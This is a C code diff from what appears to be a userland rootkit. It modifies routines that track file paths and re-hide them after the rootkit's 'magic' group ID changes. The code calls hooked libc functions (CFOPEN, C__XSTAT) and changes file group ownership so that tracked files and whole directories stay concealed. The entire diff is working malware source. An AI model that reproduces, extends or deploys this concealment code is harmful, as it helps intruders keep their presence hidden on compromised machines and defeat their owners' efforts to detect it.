@@ -24,11 +24,10 @@ int pathtracked(const char *pathname){
              *pathnametok = strtok(pathnamedup, ".");
         int count = 0;
         while(pathnametok != NULL){
-            if(!strncmp(pathnametok, "swp", 3) && count > 1){
+            if(!strncmp(pathnametok, "swp", 3) && count++ > 1){
                 free(pathnamedup);
                 return 1;
             }
-            count++;
             pathnametok = strtok(NULL, ".");
         }
         free(pathnamedup);
@@ -40,7 +39,8 @@ int pathtracked(const char *pathname){
     memset(line, 0, sizeof(line));
     
     fp = call(CFOPEN, ASS_PATH, "r");
-    if(fp == NULL) return 0; // cant open the file..just say ok write it
+    if(fp == NULL && errno == ENOENT) return 0;
+    else if(fp == NULL) return 1;
     
     while(fgets(line, sizeof(line), fp) != NULL){
         if(!strcmp(line, pathname)){
@@ -60,15 +60,19 @@ void trackwrite(const char *pathname){
     fp = call(CFOPEN, ASS_PATH, "a");
     if(fp == NULL) return;
     snprintf(buf,sizeof(buf),"%s\n",pathname);
-    call(CFWRITE, buf, strlen(buf), 1, fp);
+    call(CFWRITE, buf, 1, strlen(buf), fp);
     fclose(fp);
     chown_path(ASS_PATH, readgid());
 }
 
-void hidemyass(void){
+// this is called by changerkgid() after the magic ID has been changed & rootkit stuff has been rehidden & respawned.
+// all of the paths stored in ASS_PATH are rehidden. if a target path is in a directory, the directory is hidden
+// recursively.
+void hidemyass(gid_t oldgid){
     FILE *fp;
     struct stat assstat, assdirstat;
     gid_t magicgid;
+    char *assdirname;
 
     hook(CFOPEN, C__XSTAT);
 
@@ -85,22 +89,22 @@ void hidemyass(void){
             if((long)call(C__XSTAT, _STAT_VER, line, &assstat) < 0)
                 continue;
 
-            if(assstat.st_gid == 0)
-                continue; // assume path has been manually unhidden...
+            if(assstat.st_gid != oldgid)
+                continue;
 
             if(S_ISDIR(assstat.st_mode))
                 hidedircontents(line, magicgid);
             else if(S_ISREG(assstat.st_mode))
                 chown_path(line, magicgid);
 
-            char *assdirname = dirname(line);
+            assdirname = dirname(line);
             if(assdirname == NULL) continue;
 
             memset(&assdirstat, 0, sizeof(struct stat));
             if((long)call(C__XSTAT, _STAT_VER, assdirname, &assdirstat) < 0)
                 continue;
 
-            if(assdirstat.st_gid != 0)
+            if(assdirstat.st_gid == oldgid)
                 hidedircontents(assdirname, magicgid);
         }
 
